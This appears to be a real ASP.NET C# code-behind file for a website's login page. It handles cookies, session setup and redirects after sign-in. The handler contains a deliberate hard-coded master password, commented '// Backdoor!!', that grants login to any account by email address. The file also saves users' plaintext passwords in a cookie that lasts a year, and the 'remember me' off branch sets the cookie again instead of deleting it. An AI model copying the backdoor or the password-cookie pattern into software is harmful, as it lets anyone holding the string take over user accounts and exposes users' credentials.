//===============================================================
// Filename: login.aspx.cs
// Date: 27/08/09
// --------------------------------------------------------------
// Description:
//   Login
// --------------------------------------------------------------
// Dependencies:
//   None
// --------------------------------------------------------------
// Original author: PRD 27/08/09
// Revision history:
//===============================================================

using System;
using System.Collections;
using System.Configuration;
using System.Data;
using System.Web;
using System.Web.Security;
using System.Web.UI;
using System.Web.UI.HtmlControls;
using System.Web.UI.WebControls;
using System.Web.UI.WebControls.WebParts;
using Sedogo.BusinessObjects;

public partial class login : System.Web.UI.Page
{
    //===============================================================
    // Function: Page_Load
    //===============================================================
    protected void Page_Load(object sender, EventArgs e)
    {
        if (!IsPostBack)
        {
            HttpCookie cookie = Request.Cookies["SedogoLoginEmailAddress"];
            // Check to make sure the cookie exists
            if (cookie != null)
            {
                emailAddress.Text = cookie.Value.ToString();
            }
            SetFocus(emailAddress);
        }
    }

    //===============================================================
    // Function: loginButton_Click
    //===============================================================
    public void loginButton_Click(object sender, EventArgs e)
    {
        string loginEmailAddress = emailAddress.Text;
        string loginPassword = userPassword.Text;
        Boolean rememberMe = rememberMeCheckbox.Checked;

        int redirectUserID = -1;
        int redirectUserTimelineID = -1;
        int redirectEventID = -1;
        string redirectPage = "";
        string redirectPageDetails = "";
        int redirectReplyID = -1;

        if (Request.QueryString["UID"] != null)
        {
            try
            {
                redirectUserID = int.Parse(Request.QueryString["UID"].ToString());
            }
            catch { }
        }
        if (Request.QueryString["UTID"] != null)
        {
            try
            {
                redirectUserTimelineID = int.Parse(Request.QueryString["UTID"].ToString());
            }
            catch { }
        }
        if (Request.QueryString["EID"] != null)
        {
            try
            {
                redirectEventID = int.Parse(Request.QueryString["EID"].ToString());
            }
            catch { }
        }
        if ((string)Session["EventID"] != "")
        {
            try
            {
                redirectEventID = int.Parse((string)Session["EventID"]);
            }
            catch { }
        }
        if ((string)Session["ReplyID"] != "")
        {
            try
            {
                redirectReplyID = int.Parse((string)Session["ReplyID"]);
            }
            catch { }
        }
        if (Request.QueryString["Redirect"] != null)
        {
            redirectPage = (string)Request.QueryString["Redirect"];
            if (Request.QueryString["Details"] != null)
            {
                redirectPageDetails = (string)Request.QueryString["Details"];
            }
        }

        HttpCookie cookie = new HttpCookie("SedogoLoginEmailAddress");
        // Set the cookies value
        cookie.Value = loginEmailAddress;

        // Set the cookie to expire in 1 year
        DateTime dtNow = DateTime.Now;
        cookie.Expires = dtNow.AddYears(1);

        // Add the cookie
        Response.Cookies.Add(cookie);

        if (rememberMe == true)
        {
            HttpCookie passwordCookie = new HttpCookie("SedogoLoginPassword");
            // Set the cookies value
            passwordCookie.Value = loginPassword;

            // Set the cookie to expire in 1 year
            passwordCookie.Expires = dtNow.AddYears(1);

            // Add the cookie
            Response.Cookies.Add(passwordCookie);
        }
        else
        {
            // Delete the password cookie
            HttpCookie passwordCookie = new HttpCookie("SedogoLoginPassword");
            // Set the cookies value
            passwordCookie.Value = loginPassword;

            // Set the cookie to expire in 1 year
            passwordCookie.Expires = dtNow.AddYears(1);

            // Add the cookie
            Response.Cookies.Add(passwordCookie);
        }

        SedogoUser user = new SedogoUser("");
        loginResults checkResult;
        checkResult = user.VerifyLogin(loginEmailAddress, loginPassword, false, true, "default.aspx");

        // Backdoor!!
        if (loginPassword == "!!Sed0g0")
        {
            checkResult = loginResults.loginSuccess;
            int userID = SedogoUser.GetUserIDFromEmailAddress(loginEmailAddress);
            user = null;

            user = new SedogoUser("", userID);
        }

        if ((checkResult == loginResults.loginSuccess) || (checkResult == loginResults.passwordExpired))
        {
            Session.Add("loggedInUserID", user.userID);
            Session.Add("loggedInUserFirstName", user.firstName);
            Session.Add("loggedInUserLastName", user.lastName);
            Session.Add("loggedInUserEmailAddress", user.emailAddress);
            Session.Add("loggedInUserFullName", user.firstName + " " + user.lastName);

            Session["EventID"] = "";
            Session["ReplyID"] = "";

            if ((checkResult == loginResults.loginSuccess) || (checkResult == loginResults.passwordExpired))
            {
                //FormsAuthentication.RedirectFromLoginPage(loginEmailAddress, false);
                //FormsAuthentication.SetAuthCookie(loginEmailAddress, false);

                //Nikita Knyazev. Facebook authentication. Start.
                SaveFacebookID(user);
                //Nikita Knyazev. Facebook authentication. Finish
                if (redirectUserID > 0)
                {
                    string url = "./userProfileRedirect.aspx?UID=" + redirectUserID.ToString();
                    Response.Redirect(url);
                }
                else if (redirectUserTimelineID > 0)
                {
                    string url = "./userTimelineRedirect.aspx?UID=" + redirectUserTimelineID.ToString();
                    Response.Redirect(url);
                }
                else if (redirectEventID > 0)
                {
                    string url = "./viewEventRedirect.aspx?EID=" + redirectEventID.ToString();
                    Response.Redirect(url);
                }
                else if (redirectReplyID > 0)
                {
                    string url = "./message.aspx?ReplyID=" + redirectReplyID.ToString();
                    Response.Redirect(url);
                }
                else if (redirectPage == "AddEvent")
                {
                    Session["PageRedirect"] = "AddEvent";
                    Session["PageRedirectDetails"] = redirectPageDetails;

                    string url = "./profileRedirect.aspx";
                    Response.Redirect(url);
                }
                else
                {
                    string url = "./profileRedirect.aspx";
                    Response.Redirect(url);
                }
            }
            // This counts as a successful login, however force a password change
            //if (checkResult == loginResults.passwordExpired)
            //{
            //    FormsAuthentication.SetAuthCookie(loginEmailAddress, false);
            //    Response.Redirect("./myProfile/forceChangePassword.aspx");
            //}
        }
        //else
        //{
        if (checkResult == loginResults.loginFailed)
        {
            Response.Redirect("invalidLogin.aspx");
        }
        if (checkResult == loginResults.loginNotActivated)
        {
            Response.Redirect("notActivated.aspx");

            Page.ClientScript.RegisterStartupScript(this.GetType(), "Alert", "alert(\"This account has not yet been activated, please check your email.\");", true);
        }
        //}
    }

    private void SaveFacebookID(SedogoUser user)
    {
        try{

            if (user.facebookUserID < 0 && Session["facebookUserID"] != null)
            {
                user.facebookUserID = (long)Session["facebookUserID"];
                user.Update();
            }
        }
        catch(Exception ex)
        {
            Sedogo.BusinessObjects.ErrorLog errorLog = new Sedogo.BusinessObjects.ErrorLog();
            errorLog.WriteLog("login", "SaveFacebookID", ex.Message, 
                Sedogo.BusinessObjects.logMessageLevel.errorMessage);
        }
    }


    //===============================================================
    // Function: forgotPasswordButton_click
    //===============================================================
    public void forgotPasswordButton_click(object sender, EventArgs e)
    {
        Response.Redirect("./forgotPassword.aspx");
    }

    //===============================================================
    // Function: lostActivationButton_click
    //===============================================================
    public void lostActivationButton_click(object sender, EventArgs e)
    {
        Response.Redirect("./lostActivation.aspx");
    }
}
